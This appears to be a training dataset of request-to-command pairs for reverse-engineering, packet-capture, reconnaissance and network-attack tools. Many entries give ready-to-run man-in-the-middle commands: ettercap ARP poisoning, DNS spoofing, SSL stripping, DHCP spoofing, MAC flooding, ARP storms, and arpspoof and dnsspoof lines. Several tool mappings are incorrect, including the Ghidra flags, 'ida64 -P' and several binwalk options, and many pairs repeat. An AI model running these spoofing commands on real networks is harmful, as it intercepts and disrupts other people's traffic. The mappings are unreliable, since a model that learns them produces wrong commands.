{"input": "Perform scripted analysis in IDA Free by executing script.idc on binary.elf.", "output": "ida64 -S script.idc binary.elf"}
{"input": "Trace system and library calls for ./binary.", "output": "ltrace -S ./binary"}
{"input": "Perform system call tracing on ./binary to observe its library interactions.", "output": "ltrace -S ./binary"}
{"input": "Trace system calls for ./binary, including its child processes.", "output": "strace -f ./binary"}
{"input": "Follow all syscalls from ./binary and any spawned children.", "output": "strace -f ./binary"}
{"input": "Trace only open system calls from ./binary.", "output": "strace -e open ./binary"}
{"input": "Capture system call tracing of open events on ./binary.", "output": "strace -e open ./binary"}
{"input": "Display the symbol table entries of the ELF binary binary.elf.", "output": "readelf -s binary.elf"}
{"input": "Perform symbol analysis on binary.elf to list its symbols.", "output": "readelf -s binary.elf"}
{"input": "Display the relocation entries in binary.elf for relocation analysis.", "output": "readelf -r binary.elf"}
{"input": "Inspect ELF relocations on binary.elf to support relocation analysis.", "output": "readelf -r binary.elf"}
{"input": "Automate debugging of ./binary by running GDB in batch mode using commands.gdb.", "output": "gdb --batch -x commands.gdb ./binary"}
{"input": "Run batch-mode debugging on ./binary with the command file commands.gdb.", "output": "gdb --batch -x commands.gdb ./binary"}
{"input": "Extract binary blobs from firmware.bin for analysis.", "output": "binwalk -B firmware.bin"}
{"input": "Perform firmware analysis on firmware.bin and pull out binary blobs.", "output": "binwalk -B firmware.bin"}
{"input": "Run Radare2 non-interactively to analyze ./binary automatically.", "output": "r2 -c 'aaa' ./binary"}
{"input": "Kick off automated binary analysis on ./binary using non-interactive commands.", "output": "r2 -c 'aaa' ./binary"}
{"input": "Analyze firmware.bin to identify and extract instruction sets.", "output": "binwalk -I firmware.bin"}
{"input": "Perform firmware analysis on firmware.bin focused on instruction set extraction.", "output": "binwalk -I firmware.bin"}
{"input": "Attach GDB to the running process with PID 1234 for debugging.", "output": "gdb -p 1234"}
{"input": "Begin process debugging by attaching to PID 1234.", "output": "gdb -p 1234"}
{"input": "Automate headless analysis of binary.elf using Ghidra, storing results in ./project.", "output": "ghidra -analyzeHeadless ./project binary.elf"}
{"input": "Run a headless Ghidra analysis on binary.elf and save it under ./project.", "output": "ghidra -analyzeHeadless ./project binary.elf"}
{"input": "Display the section headers of binary.elf for section analysis.", "output": "objdump -h binary.elf"}
{"input": "List all sections in binary.elf to analyze its layout.", "output": "objdump -h binary.elf"}
{"input": "Trace library calls for ./binary, including any child processes.", "output": "ltrace -f ./binary"}
{"input": "Perform library call tracing on ./binary and include its child processes.", "output": "ltrace -f ./binary"}
{"input": "Execute the Radare2 script script.r2 to analyze ./binary.", "output": "r2 -i script.r2 ./binary"}
{"input": "Perform scripted analysis on ./binary using script.r2.", "output": "r2 -i script.r2 ./binary"}
{"input": "Display relocation entries for binary.elf to support relocation analysis.", "output": "objdump -r binary.elf"}
{"input": "List the relocation records present in binary.elf for inspection.", "output": "objdump -r binary.elf"}
{"input": "Extract single-byte encoded strings from binary.", "output": "strings -e s binary"}
{"input": "Perform string extraction on binary using a single-byte encoding.", "output": "strings -e s binary"}
{"input": "Delete the Ghidra project 'project' as part of project management.", "output": "ghidra -delete project"}
{"input": "Remove the 'project' Ghidra project to tidy up project management.", "output": "ghidra -delete project"}
{"input": "Count the library calls made by ./binary.", "output": "ltrace -c ./binary"}
{"input": "Perform library call tracing on ./binary and report totals.", "output": "ltrace -c ./binary"}
{"input": "Log the IDA Free analysis of binary.elf to log.txt.", "output": "ida64 -L log.txt binary.elf"}
{"input": "Record analysis activity for binary.elf in log.txt using IDA Free.", "output": "ida64 -L log.txt binary.elf"}
{"input": "Extract strings and their offsets from the file binary.", "output": "strings -tx binary > offsets.txt"}
{"input": "Perform string extraction on binary, including reporting each string's offset.", "output": "strings -tx binary > offsets.txt"}
{"input": "Open binary.elf with IDA Free in portable mode.", "output": "ida64 -P binary.elf"}
{"input": "Conduct portable analysis of binary.elf using IDA Free.", "output": "ida64 -P binary.elf"}
{"input": "Trace library calls with instruction pointers for ./binary.", "output": "ltrace -i ./binary"}
{"input": "Perform library call tracing on ./binary and show instruction pointers.", "output": "ltrace -i ./binary"}
{"input": "For dynamic analysis, display the dynamic section of binary.elf.", "output": "readelf -d binary.elf"}
{"input": "Show the ELF dynamic entries in binary.elf.", "output": "readelf -d binary.elf"}
{"input": "Attach strace to PID 1234 for process tracing.", "output": "strace -p 1234"}
{"input": "Trace the running process with PID 1234 using strace.", "output": "strace -p 1234"}
{"input": "Display the notes section of the ELF binary binary.elf.", "output": "readelf -n binary.elf"}
{"input": "Perform notes analysis on binary.elf to review its ELF notes.", "output": "readelf -n binary.elf"}
{"input": "Automatically run ./binary in GDB to begin binary debugging.", "output": "gdb --eval-command='run' ./binary"}
{"input": "Start debugging ./binary by launching it in GDB and running it right away.", "output": "gdb --eval-command='run' ./binary"}
{"input": "Set a breakpoint at main while debugging ./binary in GDB.", "output": "gdb --eval-command='break main' ./binary"}
{"input": "Start debugging ./binary and break at main for analysis.", "output": "gdb --eval-command='break main' ./binary"}
{"input": "Disassemble ./binary using Intel syntax in Radare2.", "output": "r2 -e asm.syntax=intel ./binary"}
{"input": "Launch Radare2 on ./binary and set disassembly to Intel syntax.", "output": "r2 -e asm.syntax=intel ./binary"}
{"input": "Trace system calls with timestamps while running ./binary.", "output": "strace -t ./binary"}
{"input": "Capture timestamped syscall activity from ./binary.", "output": "strace -t ./binary"}
{"input": "Analyze firmware.bin for architecture-specific code during firmware analysis.", "output": "binwalk -A firmware.bin"}
{"input": "Identify CPU architecture signatures present in firmware.bin for firmware analysis.", "output": "binwalk -A firmware.bin"}
{"input": "Extract strings from the data sections of binary only.", "output": "strings -d binary"}
{"input": "Pull just the data-section strings out of binary.", "output": "strings -d binary"}
{"input": "Import binary.elf without automatic analysis for manual review.", "output": "ghidra -noanalysis binary.elf"}
{"input": "Load binary.elf with auto-analysis disabled to begin manual binary analysis.", "output": "ghidra -noanalysis binary.elf"}
{"input": "Set the Ghidra scripted analysis path to scripts/.", "output": "ghidra -scriptPath scripts/"}
{"input": "Configure scripted analysis in Ghidra to load from scripts/.", "output": "ghidra -scriptPath scripts/"}
{"input": "Extract data segments from the firmware file firmware.bin during firmware analysis.", "output": "binwalk -D firmware.bin"}
{"input": "Perform firmware analysis by extracting data segments from firmware.bin.", "output": "binwalk -D firmware.bin"}
{"input": "Disassemble only the .text section of binary.elf.", "output": "objdump -j .text binary.elf"}
{"input": "Extract the .text section from binary.elf for focused disassembly.", "output": "objdump -j .text binary.elf"}
{"input": "Extract little-endian encoded strings from the file binary.", "output": "strings -e l binary"}
{"input": "Retrieve printable strings in little-endian format from binary.", "output": "strings -e l binary"}
{"input": "Disassemble every section of binary.elf to review all instructions.", "output": "objdump -D binary.elf"}
{"input": "Perform a comprehensive disassembly of binary.elf across all sections.", "output": "objdump -D binary.elf"}
{"input": "Disassemble the main function of ./binary.", "output": "r2 -c 'pdf @ main' ./binary"}
{"input": "Produce a function disassembly of main from ./binary.", "output": "r2 -c 'pdf @ main' ./binary"}
{"input": "Trace only malloc library calls while executing ./binary.", "output": "ltrace -e malloc ./binary"}
{"input": "Capture only malloc calls from ./binary when it runs.", "output": "ltrace -e malloc ./binary"}
{"input": "Count the system calls made by ./binary.", "output": "strace -c ./binary"}
{"input": "Trace system calls on ./binary and get a summary of call usage.", "output": "strace -c ./binary"}
{"input": "Attach ltrace to the running process with PID 1234.", "output": "ltrace -p 1234"}
{"input": "Perform process tracing on PID 1234.", "output": "ltrace -p 1234"}
{"input": "Trace only signal-related system calls for ./binary.", "output": "strace -e signal ./binary"}
{"input": "Monitor ./binary focusing on signals during system call tracing.", "output": "strace -e signal ./binary"}
{"input": "Open binary.elf in IDA Free with a clean database.", "output": "ida64 -C binary.elf"}
{"input": "Start a clean analysis of binary.elf using IDA Free.", "output": "ida64 -C binary.elf"}
{"input": "Display the program headers of binary.elf for program header analysis.", "output": "readelf -l binary.elf"}
{"input": "List ELF program headers in binary.elf for analysis.", "output": "readelf -l binary.elf"}
{"input": "Start GDB in its text user interface to debug ./binary.", "output": "gdb --tui ./binary"}
{"input": "Open ./binary in the TUI for binary debugging.", "output": "gdb --tui ./binary"}
{"input": "Enter Radare2 visual mode for ./binary.", "output": "r2 -c 'v' ./binary"}
{"input": "Do visual binary analysis of ./binary in Radare2.", "output": "r2 -c 'v' ./binary"}
{"input": "Open ./binary in Radare2 and seek directly to the main function.", "output": "r2 -c 's main' ./binary"}
{"input": "Begin function analysis by jumping to main in ./binary using Radare2.", "output": "r2 -c 's main' ./binary"}
{"input": "Perform raw entropy analysis on firmware.bin.", "output": "binwalk -R firmware.bin"}
{"input": "Analyze the firmware image firmware.bin for entropy anomalies as part of firmware analysis.", "output": "binwalk -R firmware.bin"}
{"input": "Generate entropy graphs for firmware.bin to support firmware analysis.", "output": "binwalk -E firmware.bin"}
{"input": "Perform firmware analysis by plotting entropy of firmware.bin.", "output": "binwalk -E firmware.bin"}
{"input": "Launch Wireshark to begin packet capturing and network packet analysis.", "output": "wireshark"}
{"input": "Open Wireshark and start capturing packets for analysis.", "output": "wireshark"}
{"input": "Analyze binary.elf with IDA Free, ensuring the file is treated as ELF.", "output": "ida64 -T ELF binary.elf"}
{"input": "Perform binary analysis of binary.elf as an ELF file.", "output": "ida64 -T ELF binary.elf"}
{"input": "Open ./binary in GDB with write permissions to allow direct modification.", "output": "gdb --write ./binary"}
{"input": "Prepare for binary patching by enabling write access and editing ./binary.", "output": "gdb --write ./binary"}
{"input": "Run Ghidra analysis capped at 4 CPU cores to conserve resources.", "output": "ghidra -max-cpu 4"}
{"input": "Limit Ghidra to 4 cores during analysis for resource management.", "output": "ghidra -max-cpu 4"}
{"input": "Capture packets on eth0 using Wireshark.", "output": "wireshark -i eth0"}
{"input": "Begin an interface-specific packet capture on eth0.", "output": "wireshark -i eth0"}
{"input": "Perform ELF analysis on binary.elf and display wide output details.", "output": "readelf -W binary.elf"}
{"input": "Inspect binary.elf with expanded, wide-format information for thorough ELF analysis.", "output": "readelf -W binary.elf"}
{"input": "Set the analysis processor to x86_64 in Ghidra.", "output": "ghidra -processor x86_64"}
{"input": "Perform processor-specific analysis targeting x86_64.", "output": "ghidra -processor x86_64"}
{"input": "Capture network packets on the eth0 interface.", "output": "tcpdump -i eth0"}
{"input": "Start a packet capture on eth0.", "output": "tcpdump -i eth0"}
{"input": "Read and analyze packets from capture.pcap.", "output": "tcpdump -r capture.pcap"}
{"input": "Perform packet analysis on capture.pcap to review recorded traffic.", "output": "tcpdump -r capture.pcap"}
{"input": "Capture network traffic on interface eth0 and save all packets to capture.pcap.", "output": "tcpdump -i eth0 -w capture.pcap"}
{"input": "Start packet capturing on eth0, writing the pcap output to capture.pcap.", "output": "tcpdump -i eth0 -w capture.pcap"}
{"input": "Perform ARP poisoning between 192.168.1.1 and 192.168.1.100.", "output": "ettercap -T -M arp /192.168.1.1/ /192.168.1.100/"}
{"input": "Run an ARP spoofing attack between 192.168.1.1 and 192.168.1.100.", "output": "ettercap -T -M arp /192.168.1.1/ /192.168.1.100/"}
{"input": "Perform DNS spoofing on the 192.168.1.0/24 network.", "output": "ettercap -T -P dns_spoof /192.168.1.0/24/"}
{"input": "Spoof DNS responses across 192.168.1.0/24.", "output": "ettercap -T -P dns_spoof /192.168.1.0/24/"}
{"input": "Perform ARP spoofing to poison 192.168.1.100 by impersonating 192.168.1.1.", "output": "arpspoof -i eth0 -t 192.168.1.100 192.168.1.1"}
{"input": "Spoof ARP packets so 192.168.1.100 thinks you're 192.168.1.1.", "output": "arpspoof -i eth0 -t 192.168.1.100 192.168.1.1"}
{"input": "Perform DNS spoofing on interface eth0 using the mappings in hosts.txt.", "output": "dnsspoof -i eth0 -f hosts.txt"}
{"input": "Spoof DNS responses via eth0 based on entries from hosts.txt.", "output": "dnsspoof -i eth0 -f hosts.txt"}
{"input": "Start Ettercap in text mode to sniff on eth0.", "output": "ettercap -T -i eth0"}
{"input": "Begin network sniffing on the eth0 interface using Ettercap text mode.", "output": "ettercap -T -i eth0"}
{"input": "Spoof DNS responses for 192.168.1.100.", "output": "dnsspoof -i eth0 host 192.168.1.100"}
{"input": "Perform DNS spoofing against the host at 192.168.1.100.", "output": "dnsspoof -i eth0 host 192.168.1.100"}
{"input": "Analyze packets from capture.pcap.", "output": "tshark -r capture.pcap"}
{"input": "Perform packet analysis on capture.pcap.", "output": "tshark -r capture.pcap"}
{"input": "Capture packets on eth0 using Tshark.", "output": "tshark -i eth0"}
{"input": "Start a packet capture on eth0.", "output": "tshark -i eth0"}
{"input": "Open capture.pcap in Wireshark for packet analysis.", "output": "wireshark -r capture.pcap"}
{"input": "Load capture.pcap for analysis in Wireshark.", "output": "wireshark -r capture.pcap"}
{"input": "Capture network packets on eth0 and save them into output.pcap.", "output": "tshark -i eth0 -w output.pcap"}
{"input": "Record traffic from interface eth0, writing the pcap output to output.pcap.", "output": "tshark -i eth0 -w output.pcap"}
{"input": "Randomize the MAC address on eth0 for MAC spoofing.", "output": "macchanger -r eth0"}
{"input": "Perform MAC spoofing by randomizing the MAC of eth0.", "output": "macchanger -r eth0"}
{"input": "Capture HTTP traffic on eth0 for this assessment.", "output": "tcpdump -i eth0 port 80"}
{"input": "Filter and record only HTTP packets on eth0.", "output": "tcpdump -i eth0 port 80"}
{"input": "Capture 100 packets on eth0 for a quick, limited snapshot.", "output": "tcpdump -i eth0 -c 100"}
{"input": "Grab a limited capture of 100 packets on eth0.", "output": "tcpdump -i eth0 -c 100"}
{"input": "Perform ARP spoofing by sending spoofed ARP replies to 192.168.1.1 about 192.168.1.100.", "output": "arpspoof -i eth0 -t 192.168.1.1 192.168.1.100"}
{"input": "Send spoofed ARP responses to 192.168.1.1 regarding 192.168.1.100 to enable bidirectional poisoning.", "output": "arpspoof -i eth0 -t 192.168.1.1 192.168.1.100"}
{"input": "Set the MAC on eth0 to 00:11:22:33:44:55 for MAC spoofing.", "output": "macchanger -m 00:11:22:33:44:55 eth0"}
{"input": "Spoof eth0 by assigning 00:11:22:33:44:55 as its MAC address.", "output": "macchanger -m 00:11:22:33:44:55 eth0"}
{"input": "Launch DHCP spoofing on the network using 192.168.1.100/192.168.1.1.", "output": "ettercap -T -M dhcp:192.168.1.100/192.168.1.1/"}
{"input": "Initiate a DHCP spoofing attack with 192.168.1.100 and 192.168.1.1.", "output": "ettercap -T -M dhcp:192.168.1.100/192.168.1.1/"}
{"input": "Strip SSL from HTTPS traffic on 192.168.1.0/24 for sniffing.", "output": "ettercap -T -P sslstrip /192.168.1.0/24/"}
{"input": "Perform SSL stripping against the 192.168.1.0/24 network to sniff traffic.", "output": "ettercap -T -P sslstrip /192.168.1.0/24/"}
{"input": "Show the current MAC address on eth0.", "output": "macchanger -s eth0"}
{"input": "Perform MAC address inspection of eth0.", "output": "macchanger -s eth0"}
{"input": "Set the burned-in hardware MAC on eth0.", "output": "macchanger -b eth0"}
{"input": "Revert eth0 to its factory MAC for MAC spoofing workflows.", "output": "macchanger -b eth0"}
{"input": "Spoof DNS responses on UDP port 53.", "output": "dnsspoof -i eth0 udp port 53"}
{"input": "Carry out DNS spoofing over UDP/53.", "output": "dnsspoof -i eth0 udp port 53"}
{"input": "Perform ARP spoofing against 192.168.1.100.", "output": "arpspoof -i eth0 -t 192.168.1.100"}
{"input": "Send spoofed ARP replies to poison 192.168.1.100.", "output": "arpspoof -i eth0 -t 192.168.1.100"}
{"input": "Filter HTTP packets from capture.pcap.", "output": "wireshark -Y 'http' -r capture.pcap"}
{"input": "Extract only HTTP traffic when reviewing capture.pcap.", "output": "wireshark -Y 'http' -r capture.pcap"}
{"input": "Extract source IPs by pulling the ip.src field from traffic on eth0.", "output": "tshark -i eth0 -T fields -e ip.src"}
{"input": "Perform packet field extraction of ip.src on interface eth0 to list source addresses.", "output": "tshark -i eth0 -T fields -e ip.src"}
{"input": "Capture HTTPS traffic on eth0 for protocol-specific analysis.", "output": "tshark -i eth0 -f 'port 443'"}
{"input": "Sniff only HTTPS packets on eth0 to focus the protocol capture.", "output": "tshark -i eth0 -f 'port 443'"}
{"input": "Capture HTTP traffic on eth0 for analysis.", "output": "wireshark -f 'tcp port 80' -i eth0"}
{"input": "Start collecting HTTP packets on eth0 to inspect web activity.", "output": "wireshark -f 'tcp port 80' -i eth0"}
{"input": "Capture packets to and from 192.168.1.100.", "output": "tcpdump -i eth0 host 192.168.1.100"}
{"input": "Do a host-specific capture targeting 192.168.1.100.", "output": "tcpdump -i eth0 host 192.168.1.100"}
{"input": "Sniff unified packets on eth0.", "output": "ettercap -T -u -i eth0"}
{"input": "Run unified sniffing on eth0.", "output": "ettercap -T -u -i eth0"}
{"input": "Perform MAC flooding on 192.168.1.0/24 to overwhelm switches.", "output": "ettercap -T -P mac_flood /192.168.1.0/24/"}
{"input": "Test 192.168.1.0/24 with a MAC flooding attack to overwhelm switches.", "output": "ettercap -T -P mac_flood /192.168.1.0/24/"}
{"input": "Perform ARP spoofing against 192.168.1.100 using reverse poisoning.", "output": "arpspoof -i eth0 -r -t 192.168.1.100"}
{"input": "Spoof ARP traffic to 192.168.1.100 with reverse poisoning enabled.", "output": "arpspoof -i eth0 -r -t 192.168.1.100"}
{"input": "Capture 100 packets on eth0 for a quick check.", "output": "tshark -i eth0 -c 100"}
{"input": "Do a limited packet capture of 100 frames on eth0.", "output": "tshark -i eth0 -c 100"}
{"input": "Spoof the MAC address on eth0 to one similar to the original.", "output": "macchanger -e eth0"}
{"input": "Change eth0's MAC to a same-vendor address for MAC spoofing.", "output": "macchanger -e eth0"}
{"input": "Start capturing packets immediately on eth0.", "output": "wireshark -i eth0 -k"}
{"input": "Begin an immediate live packet capture on eth0.", "output": "wireshark -i eth0 -k"}
{"input": "Perform DNS spoofing with verbose output on interface eth0.", "output": "dnsspoof -i eth0 -v"}
{"input": "Spoof DNS responses on eth0 and display detailed output.", "output": "dnsspoof -i eth0 -v"}
{"input": "Capture packets with verbose output on eth0.", "output": "tcpdump -i eth0 -vv"}
{"input": "Do detailed packet capturing on eth0 with verbose output.", "output": "tcpdump -i eth0 -vv"}
{"input": "Generate an ARP storm against 192.168.1.0/24.", "output": "ettercap -T -P arp_storm /192.168.1.0/24/"}
{"input": "Perform ARP storming across the 192.168.1.0/24 network segment.", "output": "ettercap -T -P arp_storm /192.168.1.0/24/"}
{"input": "Capture packets on interface eth0 without DNS resolution.", "output": "tcpdump -i eth0 -n"}
{"input": "Start packet capturing on eth0 and disable DNS lookups.", "output": "tcpdump -i eth0 -n"}
{"input": "Perform port stealing for sniffing between 192.168.1.100 and 192.168.1.1.", "output": "ettercap -T -M port /192.168.1.100/ /192.168.1.1/"}
{"input": "Set up a port stealing sniff against 192.168.1.100 via 192.168.1.1.", "output": "ettercap -T -M port /192.168.1.100/ /192.168.1.1/"}
{"input": "Perform ARP spoofing against 192.168.1.100 on eth0 using the MAC 00:11:22:33:44:55.", "output": "arpspoof -i eth0 -t 192.168.1.100 -h 00:11:22:33:44:55"}
{"input": "Spoof ARP packets to 192.168.1.100 with MAC 00:11:22:33:44:55 on interface eth0.", "output": "arpspoof -i eth0 -t 192.168.1.100 -h 00:11:22:33:44:55"}
{"input": "List known MAC address vendors for reconnaissance.", "output": "macchanger -l"}
{"input": "Show the MAC vendor list to support MAC address reconnaissance.", "output": "macchanger -l"}
{"input": "Show real-time packet statistics on eth0.", "output": "wireshark -z io,stat,1 -i eth0"}
{"input": "Monitor traffic statistics on eth0 in real time.", "output": "wireshark -z io,stat,1 -i eth0"}
{"input": "Display packet statistics every second on eth0.", "output": "tshark -i eth0 -z io,stat,1"}
{"input": "Collect traffic statistics each second for eth0.", "output": "tshark -i eth0 -z io,stat,1"}
{"input": "Scan 192.168.1.0/24 for live hosts.", "output": "nmap 192.168.1.0/24"}
{"input": "Discover active systems on the 192.168.1.0/24 network range.", "output": "nmap 192.168.1.0/24"}
{"input": "Filter and display only HTTP requests on eth0 using the 'http.request' filter.", "output": "tshark -i eth0 -Y 'http.request'"}
{"input": "For packet filtering, show HTTP request packets captured from eth0 and ignore other traffic.", "output": "tshark -i eth0 -Y 'http.request'"}
{"input": "Launch Maltego to begin OSINT analysis and relationship mapping.", "output": "maltego"}
{"input": "Open Maltego to start OSINT-focused relationship mapping.", "output": "maltego"}
{"input": "Spoof DNS responses with debugging output enabled.", "output": "dnsspoof -i eth0 -d"}
{"input": "Perform DNS spoofing and display detailed debug information during the attack.", "output": "dnsspoof -i eth0 -d"}
{"input": "Capture packets on eth0 with a snaplen of 1500 bytes.", "output": "tcpdump -i eth0 -s 1500"}
{"input": "Start packet capturing on eth0, limiting capture size to 1500 bytes per packet.", "output": "tcpdump -i eth0 -s 1500"}
{"input": "Enumerate DNS records for example.com.", "output": "dnsenum example.com"}
{"input": "Perform DNS enumeration against example.com.", "output": "dnsenum example.com"}
{"input": "Perform ICMP redirect spoofing against the 192.168.1.0/24 network.", "output": "ettercap -T -P icmp_redirect /192.168.1.0/24/"}
{"input": "Launch ICMP spoofing on hosts in 192.168.1.0/24.", "output": "ettercap -T -P icmp_redirect /192.168.1.0/24/"}
{"input": "Gather emails and subdomains for example.com from Google.", "output": "theharvester -d example.com -b google"}
{"input": "Perform OSINT email harvesting against example.com using Google search results.", "output": "theharvester -d example.com -b google"}
{"input": "Search for Linux-based devices on Shodan that are exposed to the internet.", "output": "shodan search --fields ip_str,port,org 'os:linux'"}
{"input": "Identify internet-facing Linux hosts using Shodan.", "output": "shodan search --fields ip_str,port,org 'os:linux'"}
{"input": "Enumerate subdomains for example.com using multiple sources.", "output": "sublist3r -d example.com"}
{"input": "Perform subdomain enumeration against example.com.", "output": "sublist3r -d example.com"}
{"input": "Enumerate subdomains for example.com.", "output": "amass enum -d example.com"}
{"input": "Find and list subdomains belonging to example.com.", "output": "amass enum -d example.com"}
{"input": "Retrieve WHOIS information for example.com.", "output": "whois example.com"}
{"input": "Perform domain reconnaissance by checking the WHOIS record for example.com.", "output": "whois example.com"}
{"input": "Launch recon-ng to kick off reconnaissance tasks.", "output": "recon-ng"}
{"input": "Start the recon-ng framework to begin recon.", "output": "recon-ng"}
{"input": "Perform DNS enumeration against example.com to discover subdomains and related DNS records.", "output": "fierce --domain example.com"}
{"input": "Map out example.com's subdomains and DNS entries via DNS enumeration.", "output": "fierce --domain example.com"}
{"input": "Extract metadata from documents hosted under example.com.", "output": "metagoofil -d example.com -t doc,pdf -o output.html"}
{"input": "Perform metadata extraction on documents from example.com.", "output": "metagoofil -d example.com -t doc,pdf -o output.html"}
{"input": "Enumerate SMB shares and user accounts on 192.168.1.100.", "output": "enum4linux 192.168.1.100"}
{"input": "Perform SMB enumeration on 192.168.1.100 to list shares and users.", "output": "enum4linux 192.168.1.100"}
{"input": "Gather WHOIS and host information for example.com.", "output": "dmitry -i example.com"}
{"input": "Perform domain reconnaissance on example.com to retrieve WHOIS and basic host details.", "output": "dmitry -i example.com"}
{"input": "Perform DNS reconnaissance against example.com.", "output": "dnsrecon -d example.com"}
{"input": "Enumerate DNS records for example.com.", "output": "dnsrecon -d example.com"}
{"input": "Scan http://example.com for web server misconfigurations.", "output": "nikto -h http://example.com"}
{"input": "Perform reconnaissance on the web server at http://example.com.", "output": "nikto -h http://example.com"}
{"input": "Enumerate SNMP information from 192.168.1.100.", "output": "onesixtyone 192.168.1.100"}
{"input": "Perform SNMP enumeration against the host at 192.168.1.100.", "output": "onesixtyone 192.168.1.100"}
{"input": "Identify technologies used by example.com.", "output": "whatweb example.com"}
{"input": "Perform web reconnaissance on example.com to profile its stack.", "output": "whatweb example.com"}
{"input": "Enumerate SNMP data from 192.168.1.100.", "output": "snmp-check 192.168.1.100"}
{"input": "Perform SNMP enumeration against 192.168.1.100.", "output": "snmp-check 192.168.1.100"}
{"input": "Identify if a web application firewall is in place on example.com.", "output": "wafw00f example.com"}
{"input": "Perform WAF detection against example.com.", "output": "wafw00f example.com"}
{"input": "Scan the 192.168.1.0/24 network range for live hosts.", "output": "nmap 192.168.1.0/24"}
{"input": "Perform a network scan against 192.168.1.0/24 to find active devices.", "output": "nmap 192.168.1.0/24"}
{"input": "Run a full port scan against 192.168.1.100.", "output": "unicornscan 192.168.1.100 -p 1-65535"}
{"input": "Perform port scanning on 192.168.1.100 to identify open services.", "output": "unicornscan 192.168.1.100 -p 1-65535"}
{"input": "Send reconnaissance SYN packets to 192.168.1.100 on port 80.", "output": "hping3 -S 192.168.1.100 -p 80"}
{"input": "Craft packets to probe 192.168.1.100 at port 80 during recon.", "output": "hping3 -S 192.168.1.100 -p 80"}
{"input": "Launch Maltego to begin OSINT analysis and relationship mapping.", "output": "maltego"}
{"input": "Open Maltego for OSINT analysis to explore entity relationships.", "output": "maltego"}
{"input": "Scan 192.168.1.0/24 for open ports 80 and 443.", "output": "masscan 192.168.1.0/24 -p80,443"}
{"input": "Perform port scanning on 192.168.1.0/24 to identify services on 80 and 443.", "output": "masscan 192.168.1.0/24 -p80,443"}
{"input": "Launch SPARTA to begin network reconnaissance.", "output": "sparta"}
{"input": "Open SPARTA and start network scanning.", "output": "sparta"}
{"input": "Discover active hosts on the local network via interface eth0.", "output": "netdiscover -i eth0"}
{"input": "Perform network discovery on eth0 to identify live devices.", "output": "netdiscover -i eth0"}
{"input": "Gather emails and subdomains for example.com from Google using OSINT.", "output": "theharvester -d example.com -b google"}
{"input": "Perform OSINT email harvesting against example.com via Google, including subdomain discovery.", "output": "theharvester -d example.com -b google"}
{"input": "Enumerate DNS records for example.com.", "output": "dnsenum example.com"}
{"input": "Perform DNS enumeration against example.com to list its records.", "output": "dnsenum example.com"}
{"input": "Retrieve WHOIS information for example.com.", "output": "whois example.com"}
{"input": "Perform domain reconnaissance on example.com by pulling its WHOIS record.", "output": "whois example.com"}
{"input": "Launch Recon-ng to start reconnaissance tasks.", "output": "recon-ng"}
{"input": "Open the Recon-ng reconnaissance framework to begin gathering intel.", "output": "recon-ng"}
{"input": "Enumerate subdomains for example.com using multiple sources.", "output": "sublist3r -d example.com"}
{"input": "Perform subdomain enumeration against example.com and gather results from various sources.", "output": "sublist3r -d example.com"}
{"input": "Enumerate subdomains for example.com.", "output": "amass enum -d example.com"}
{"input": "Perform subdomain enumeration against example.com.", "output": "amass enum -d example.com"}
{"input": "Perform DNS reconnaissance on example.com.", "output": "dnsrecon -d example.com"}
{"input": "Enumerate DNS records for example.com.", "output": "dnsrecon -d example.com"}
{"input": "Extract document metadata from example.com.", "output": "metagoofil -d example.com -t doc,pdf -o output.html"}
{"input": "Gather metadata from files available on example.com.", "output": "metagoofil -d example.com -t doc,pdf -o output.html"}
{"input": "Enumerate SMB shares and users on 192.168.1.100.", "output": "enum4linux 192.168.1.100"}
{"input": "Perform SMB enumeration against 192.168.1.100 to list accessible shares and user accounts.", "output": "enum4linux 192.168.1.100"}
{"input": "Conduct domain reconnaissance on example.com to gather WHOIS and host information.", "output": "dmitry -i example.com"}
{"input": "Collect WHOIS details and host data for example.com.", "output": "dmitry -i example.com"}
{"input": "Discover active hosts on the network using interface eth0.", "output": "netdiscover -i eth0"}
{"input": "Perform network discovery via eth0 to identify live devices.", "output": "netdiscover -i eth0"}
{"input": "Scan http://example.com for web server misconfigurations.", "output": "nikto -h http://example.com"}
{"input": "Perform web server reconnaissance against http://example.com to spot weaknesses.", "output": "nikto -h http://example.com"}
{"input": "Enumerate SNMP information from 192.168.1.100.", "output": "onesixtyone 192.168.1.100"}
{"input": "Perform SNMP enumeration against 192.168.1.100.", "output": "onesixtyone 192.168.1.100"}
{"input": "Perform DNS enumeration against example.com.", "output": "fierce --domain example.com"}
{"input": "Identify subdomains and DNS records for example.com.", "output": "fierce --domain example.com"}
{"input": "Identify the technologies used by example.com as part of web reconnaissance.", "output": "whatweb example.com"}
{"input": "Perform web recon on example.com to see which technologies it runs.", "output": "whatweb example.com"}
{"input": "Detect if a web application firewall protects example.com.", "output": "wafw00f example.com"}
{"input": "Perform WAF detection against example.com to identify any protection in place.", "output": "wafw00f example.com"}
{"input": "Perform SNMP enumeration against 192.168.1.100.", "output": "snmp-check 192.168.1.100"}
{"input": "Enumerate SNMP data from 192.168.1.100.", "output": "snmp-check 192.168.1.100"}
{"input": "Start SPARTA to begin network reconnaissance.", "output": "sparta"}
{"input": "Open SPARTA to perform network scanning.", "output": "sparta"}
{"input": "Search Shodan for internet-exposed Linux-based devices.", "output": "shodan search --fields ip_str,port,org 'os:linux'"}
{"input": "Find publicly reachable Linux hosts on Shodan.", "output": "shodan search --fields ip_str,port,org 'os:linux'"}
{"input": "Perform a port scanning sweep of 192.168.1.0/24 for open 80 and 443.", "output": "masscan 192.168.1.0/24 -p80,443"}
{"input": "Scan the 192.168.1.0/24 subnet to find hosts with ports 80 or 443 open.", "output": "masscan 192.168.1.0/24 -p80,443"}
{"input": "Use Bing to harvest OSINT emails and subdomains for example.com.", "output": "theharvester -d example.com -b bing"}
{"input": "From Bing, collect email addresses and map subdomains associated with example.com.", "output": "theharvester -d example.com -b bing"}
{"input": "Enumerate running services and their versions on 192.168.1.100.", "output": "nmap -sV 192.168.1.100"}
{"input": "Detect service versions on 192.168.1.100 for service enumeration.", "output": "nmap -sV 192.168.1.100"}
{"input": "Perform brute-force DNS enumeration against example.com.", "output": "dnsenum --enum example.com"}
{"input": "Enumerate DNS records for example.com using a brute-force approach.", "output": "dnsenum --enum example.com"}
{"input": "Craft SYN packets to probe port 80 on 192.168.1.100 for recon.", "output": "hping3 -S 192.168.1.100 -p 80"}
{"input": "Send SYNs to 192.168.1.100:80 as part of packet crafting reconnaissance.", "output": "hping3 -S 192.168.1.100 -p 80"}
{"input": "Perform a WHOIS lookup on 192.168.1.100 for IP reconnaissance.", "output": "whois 192.168.1.100"}
{"input": "Gather WHOIS details for 192.168.1.100 as part of IP reconnaissance.", "output": "whois 192.168.1.100"}
